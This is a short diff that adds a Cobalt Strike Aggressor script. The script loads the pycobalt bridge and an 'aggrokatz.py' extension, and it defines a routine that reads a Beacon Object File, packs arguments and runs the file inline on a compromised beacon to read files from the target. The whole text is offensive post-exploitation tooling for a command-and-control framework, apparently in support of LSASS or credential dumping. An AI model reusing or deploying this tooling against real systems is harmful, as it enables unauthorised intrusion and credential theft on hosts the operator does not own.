@@ -1,0 +1,23 @@
+$pycobalt_path = '/home/kali/Desktop/pycobalt/aggressor';
+include($pycobalt_path . '/pycobalt.cna');
+
+
+sub rfs {
+	local('$handle $data $args');
+	
+	# read in the right BOF file
+	$handle = openf($2);
+	$data   = readb($handle, -1);
+	closef($handle);
+	
+	# pack our arguments
+	$args   = bof_pack($1, "Ziii", $3, $4, $5, $6);
+	
+	# announce what we're doing
+	btask($1, "Reading file...");
+	
+	# execute it.
+	beacon_inline_execute($1, $data, "go", $args);
+}
+
+python(script_resource('aggrokatz.py'));
